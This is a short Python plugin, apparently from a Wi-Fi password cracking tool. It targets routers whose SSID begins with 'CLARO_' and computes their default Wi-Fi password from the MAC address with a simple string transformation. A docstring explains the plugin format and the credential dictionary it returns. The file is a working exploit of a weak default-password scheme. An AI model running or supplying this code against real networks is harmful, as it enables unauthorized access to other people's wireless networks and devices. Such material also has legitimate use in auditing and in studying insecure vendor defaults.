import re

'''
ssid = CLARO_1234
mac = 11:22:33:44:55
Plugins must be in this format :
 1. pluginName.py on the ./plugins folder.
 2. a 'is_vuln' function that returns True or False if the ssid/mac suits your plugin.
 3. a own function that returns this dictionary {'wifi_password':'passwd','admin_login':'admin','admin_password':'passwd'}
    if you can't define a variable just return False like {'wifi_password':'passwd','admin_login':False,'admin_password':False}
    'wifi_password' is a must.
 4. a 'brute' variable that specify if your plugin needs some bruteforce 
'''

brute = False

def is_vuln(ssid,mac) :
	regex = re.compile("^CLARO_")
	if regex.search(ssid) is not None:
		return True
	else : 
		return False	

def own(ssid,mac) :
	password = mac.replace(":","").upper()[4:]
	print(password)
	return {'ssid':ssid,'mac':mac,'wifi_password':password,'admin_login':False,'admin_password':False}
